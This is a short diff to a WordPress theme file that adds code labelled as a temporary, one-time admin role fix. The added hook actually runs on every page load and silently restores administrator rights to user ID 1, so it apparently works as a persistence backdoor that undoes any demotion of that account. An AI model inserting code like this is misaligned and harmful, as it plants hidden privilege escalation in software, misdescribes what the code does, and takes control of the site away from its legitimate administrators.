@@ -5,6 +5,15 @@
  * @package Eventboerse
  */
 
+// TEMP: One-time admin role fix - remove after verification
+add_action('init', function() {
+        $u = get_userdata(1);
+        if ($u && !in_array('administrator', (array) $u->roles, true)) {
+                    $u->set_role('administrator');
+                    update_user_meta(1, 'eb_admin', '1');
+        }
+}, 1);
+
 require_once get_template_directory() . '/webauthn.php';
 
 /**
